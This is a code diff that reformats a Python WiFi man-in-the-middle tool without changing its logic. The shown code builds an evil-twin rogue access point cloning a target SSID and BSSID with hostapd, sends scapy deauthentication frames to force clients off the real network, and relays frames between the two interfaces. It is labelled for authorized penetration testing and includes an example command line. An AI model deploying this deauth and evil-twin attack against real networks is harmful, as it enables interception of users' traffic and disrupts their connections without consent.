@@ -46,9 +46,33 @@ from deauth import DeauthAttacker
 # 2.4 GHz and 5 GHz channel pools used for auto-selecting a rogue channel
 # that sits far from the target's channel, preferring a different band.
 CHANNELS_2GHZ: list[int] = list(range(1, 14))
-CHANNELS_5GHZ: list[int] = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108,
-                             112, 116, 120, 124, 128, 132, 136, 140, 144,
-                             149, 153, 157, 161, 165]
+CHANNELS_5GHZ: list[int] = [
+    36,
+    40,
+    44,
+    48,
+    52,
+    56,
+    60,
+    64,
+    100,
+    104,
+    108,
+    112,
+    116,
+    120,
+    124,
+    128,
+    132,
+    136,
+    140,
+    144,
+    149,
+    153,
+    157,
+    161,
+    165,
+]
 
 
 class ChannelMitM:
@@ -60,22 +84,26 @@ class ChannelMitM:
     frames between the rogue AP and the real AP.
     """
 
-    def __init__(self, rogue_interface: str,
-                 monitor_interface: str,
-                 target_bssid: str,
-                 target_channel: int,
-                 rogue_channel: Optional[int] = None,
-                 target_client: Optional[str] = None,
-                 ssid: Optional[str] = None,
-                 timeout: int = 600,
-                 output_dir: str = "captures",
-                 forward_frames: bool = True) -> None:
+    def __init__(
+        self,
+        rogue_interface: str,
+        monitor_interface: str,
+        target_bssid: str,
+        target_channel: int,
+        rogue_channel: Optional[int] = None,
+        target_client: Optional[str] = None,
+        ssid: Optional[str] = None,
+        timeout: int = 600,
+        output_dir: str = "captures",
+        forward_frames: bool = True,
+    ) -> None:
         self.rogue_interface: str = rogue_interface
         self.monitor_interface: str = monitor_interface
         self.target_bssid: str = target_bssid
         self.target_channel: int = target_channel
         self.rogue_channel: int = (
-            rogue_channel if rogue_channel is not None
+            rogue_channel
+            if rogue_channel is not None
             else self._select_rogue_channel(target_channel)
         )
         self.target_client: Optional[str] = target_client
@@ -139,8 +167,7 @@ class ChannelMitM:
     # Rogue AP setup
     # ------------------------------------------------------------------
 
-    def _generate_hostapd_conf(self, ssid: str, interface: str, channel: int,
-                                bssid: str) -> str:
+    def _generate_hostapd_conf(self, ssid: str, interface: str, channel: int, bssid: str) -> str:
         """Generate a hostapd.conf for the rogue AP.
 
         Uses open authentication (no encryption) and pins the BSSID to
@@ -169,8 +196,7 @@ class ChannelMitM:
             f"ignore_broadcast_ssid=0\n"
         )
 
-    def _setup_rogue_ap(self, interface: str, ssid: str,
-                         channel: int) -> subprocess.Popen:
+    def _setup_rogue_ap(self, interface: str, ssid: str, channel: int) -> subprocess.Popen:
         """Start hostapd for the rogue AP, matching the target SSID/BSSID.
 
         Args:
@@ -185,7 +211,9 @@ class ChannelMitM:
             RuntimeError: If hostapd fails to start.
         """
         conf_contents = self._generate_hostapd_conf(
-            ssid=ssid, interface=interface, channel=channel,
+            ssid=ssid,
+            interface=interface,
+            channel=channel,
             bssid=self.target_bssid,
         )
 
@@ -199,17 +227,19 @@ class ChannelMitM:
         try:
             proc = subprocess.Popen(
                 ["hostapd", conf_file.name],
-                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
             )
         except FileNotFoundError as e:
-            raise RuntimeError(
-                "hostapd not found. Install with: apt install hostapd"
-            ) from e
+            raise RuntimeError("hostapd not found. Install with: apt install hostapd") from e
 
         self._hostapd_proc = proc
         self.logger.info(
             "Rogue AP starting on %s (SSID: %s, BSSID: %s, channel: %d)",
-            interface, ssid, self.target_bssid, channel,
+            interface,
+            ssid,
+            self.target_bssid,
+            channel,
         )
         return proc
 
@@ -217,8 +247,9 @@ class ChannelMitM:
     # Deauth phase
     # ------------------------------------------------------------------
 
-    def _deauth_client(self, monitor_interface: str, target_bssid: str,
-                        client: Optional[str] = None) -> None:
+    def _deauth_client(
+        self, monitor_interface: str, target_bssid: str, client: Optional[str] = None
+    ) -> None:
         """Deauthenticate the client from the real AP on the real channel.
 
         Forces the client to search for and reconnect to the rogue clone
@@ -237,14 +268,15 @@ class ChannelMitM:
         )
         self.logger.info(
             "Deauthenticating %s from %s on channel %d",
-            client or "all clients", target_bssid, self.target_channel,
+            client or "all clients",
+            target_bssid,
+            self.target_channel,
         )
         self._deauth_attacker.set_channel()
 
         packets = self._deauth_attacker.create_deauth_packet()
         try:
-            sendp(packets, iface=monitor_interface, count=5,
-                  inter=0.1, verbose=False)
+            sendp(packets, iface=monitor_interface, count=5, inter=0.1, verbose=False)
             self._deauth_attacker.packets_sent += len(packets) * 5
         except Exception as e:
             self.logger.warning("Deauth send failed: %s", e)
@@ -283,24 +315,24 @@ class ChannelMitM:
             sendp(frame, iface=dst_iface, verbose=False)
 
             with self._lock:
-                self.relayed_frames.append({
-                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                    "from": src_iface,
-                    "to": dst_iface,
-                })
+                self.relayed_frames.append(
+                    {
+                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                        "from": src_iface,
+                        "to": dst_iface,
+                    }
+                )
         except Exception as e:
-            self.logger.debug("Relay error (%s -> %s): %s",
-                               src_iface, dst_iface, e)
+            self.logger.debug("Relay error (%s -> %s): %s", src_iface, dst_iface, e)
 
     def _start_frame_relay(self) -> None:
         """Start the two sniff/relay threads between rogue and real AP."""
+
         def rogue_to_monitor(packet):
-            self._relay_handler(packet, self.rogue_interface,
-                                 self.monitor_interface)
+            self._relay_handler(packet, self.rogue_interface, self.monitor_interface)
 
         def monitor_to_rogue(packet):
-            self._relay_handler(packet, self.monitor_interface,
-                                 self.rogue_interface)
+            self._relay_handler(packet, self.monitor_interface, self.rogue_interface)
 
         def run_rogue_sniff():
             try:
@@ -324,16 +356,13 @@ class ChannelMitM:
             except Exception as e:
                 self.logger.debug("Monitor sniff thread stopped: %s", e)
 
-        self._rogue_sniff_thread = threading.Thread(
-            target=run_rogue_sniff, daemon=True
-        )
-        self._monitor_sniff_thread = threading.Thread(
-            target=run_monitor_sniff, daemon=True
-        )
+        self._rogue_sniff_thread = threading.Thread(target=run_rogue_sniff, daemon=True)
+        self._monitor_sniff_thread = threading.Thread(target=run_monitor_sniff, daemon=True)
         self._rogue_sniff_thread.start()
         self._monitor_sniff_thread.start()
-        self.logger.info("Frame relay started between %s and %s",
-                          self.rogue_interface, self.monitor_interface)
+        self.logger.info(
+            "Frame relay started between %s and %s", self.rogue_interface, self.monitor_interface
+        )
 
     # ------------------------------------------------------------------
     # Client detection
@@ -348,9 +377,7 @@ class ChannelMitM:
         """
         with self._lock:
             if self.target_client:
-                return self.target_client.lower() in {
-                    c.lower() for c in self.connected_clients
-                }
+                return self.target_client.lower() in {c.lower() for c in self.connected_clients}
             return len(self.connected_clients) > 0
 
     # ------------------------------------------------------------------
@@ -386,7 +413,8 @@ class ChannelMitM:
 
         try:
             self._setup_rogue_ap(
-                interface=self.rogue_interface, ssid=self.ssid,
+                interface=self.rogue_interface,
+                ssid=self.ssid,
                 channel=self.rogue_channel,
             )
             time.sleep(2)
@@ -401,11 +429,13 @@ class ChannelMitM:
                 self._start_frame_relay()
 
             client_connected = self._detect_client_connected()
-            self.results.update({
-                "hostapd_started": self._hostapd_proc is not None,
-                "client_connected": client_connected,
-                "end_time": datetime.now().isoformat(),
-            })
+            self.results.update(
+                {
+                    "hostapd_started": self._hostapd_proc is not None,
+                    "client_connected": client_connected,
+                    "end_time": datetime.now().isoformat(),
+                }
+            )
         except Exception as e:
             self.logger.error("MitM setup failed: %s", e)
             self.results["error"] = str(e)
@@ -452,8 +482,7 @@ class ChannelMitM:
             "target_channel": self.target_channel,
             "rogue_channel": self.rogue_channel,
             "hostapd_running": (
-                self._hostapd_proc is not None
-                and self._hostapd_proc.poll() is None
+                self._hostapd_proc is not None and self._hostapd_proc.poll() is None
             ),
             "connected_clients": len(self.connected_clients),
             "relayed_frames": len(self.relayed_frames),
@@ -494,15 +523,15 @@ class ChannelMitM:
         self._running = False
         self.logger.info(
             "Channel MitM stopped. %d frames relayed, %d clients observed.",
-            len(self.relayed_frames), len(self.connected_clients),
+            len(self.relayed_frames),
+            len(self.connected_clients),
         )
 
 
 def main() -> None:
     parser = argparse.ArgumentParser(
         description=(
-            "Channel-based WiFi MitM positioning. "
-            "For authorized penetration testing only."
+            "Channel-based WiFi MitM positioning. For authorized penetration testing only."
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
@@ -517,28 +546,31 @@ Example:
       -b AA:BB:CC:DD:EE:FF -c 6 --client CC:DD:EE:FF:00:11 --ssid "TargetAP"
         """,
     )
-    parser.add_argument("--rogue-iface", required=True,
-                         help="Interface for the rogue clone AP")
-    parser.add_argument("--monitor-iface", required=True,
-                         help="Interface on the real AP's channel")
-    parser.add_argument("-b", "--bssid", required=True,
-                         help="Target AP BSSID")
-    parser.add_argument("-c", "--channel", type=int, required=True,
-                         help="Target AP channel")
-    parser.add_argument("--rogue-channel", type=int, default=None,
-                         help="Channel for the rogue AP (auto-select if omitted)")
-    parser.add_argument("--client", default=None,
-                         help="Target client MAC address")
-    parser.add_argument("--ssid", default=None,
-                         help="SSID to clone (default: Rogue-AP)")
-    parser.add_argument("-t", "--timeout", type=int, default=600,
-                         help="Session timeout in seconds (default: 600)")
-    parser.add_argument("-o", "--output-dir", default="captures",
-                         help="Output directory for results (default: captures)")
-    parser.add_argument("--no-forward", action="store_true",
-                         help="Disable frame relay between rogue and real AP")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                         help="Enable verbose logging")
+    parser.add_argument("--rogue-iface", required=True, help="Interface for the rogue clone AP")
+    parser.add_argument("--monitor-iface", required=True, help="Interface on the real AP's channel")
+    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID")
+    parser.add_argument("-c", "--channel", type=int, required=True, help="Target AP channel")
+    parser.add_argument(
+        "--rogue-channel",
+        type=int,
+        default=None,
+        help="Channel for the rogue AP (auto-select if omitted)",
+    )
+    parser.add_argument("--client", default=None, help="Target client MAC address")
+    parser.add_argument("--ssid", default=None, help="SSID to clone (default: Rogue-AP)")
+    parser.add_argument(
+        "-t", "--timeout", type=int, default=600, help="Session timeout in seconds (default: 600)"
+    )
+    parser.add_argument(
+        "-o",
+        "--output-dir",
+        default="captures",
+        help="Output directory for results (default: captures)",
+    )
+    parser.add_argument(
+        "--no-forward", action="store_true", help="Disable frame relay between rogue and real AP"
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
 
     args = parser.parse_args()
     require_root()
